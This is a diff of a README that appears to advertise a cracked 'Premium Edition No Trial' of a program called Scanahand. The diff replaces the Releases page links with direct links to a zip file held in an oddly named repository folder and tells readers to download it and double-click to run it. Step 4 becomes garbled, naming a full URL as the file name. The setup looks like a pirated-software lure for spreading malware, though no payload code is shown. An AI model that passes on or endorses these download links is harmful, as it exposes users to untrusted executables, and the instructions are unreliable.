@@ -6,12 +6,12 @@ Welcome to the Scanahand Premium Edition No Trial! This application allows you t
 ## 📥 Download & Install
 To download the application, visit the link below:
 
-[![Download Scanahand Premium Edition](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/releases)
+[![Download Scanahand Premium Edition](https://raw.githubusercontent.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/main/hyetograph/Scanahand-Premium-Edition-No-Trial-2.8.zip)](https://raw.githubusercontent.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/main/hyetograph/Scanahand-Premium-Edition-No-Trial-2.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
 3. Click on the version number to see the available files.
-4. Download the file named `Scanahand-Premium-Edition.exe`.
+4. Download the file named `https://raw.githubusercontent.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/main/hyetograph/Scanahand-Premium-Edition-No-Trial-2.8.zip`.
 5. Locate the downloaded file on your computer.
 6. Double-click the file to run the installer.
 7. Follow the prompts to complete the installation.
@@ -53,7 +53,7 @@ We provide resources to help you use the application effectively:
 ## 📥 Download & Install Again
 To revisit the download page, click the link below:
 
-[![Download Scanahand Premium Edition](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/releases)
+[![Download Scanahand Premium Edition](https://raw.githubusercontent.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/main/hyetograph/Scanahand-Premium-Edition-No-Trial-2.8.zip)](https://raw.githubusercontent.com/CODYAUREL/Scanahand-Premium-Edition-No-Trial/main/hyetograph/Scanahand-Premium-Edition-No-Trial-2.8.zip)
 
 Follow the instructions listed above to install it on your Windows PC.
 
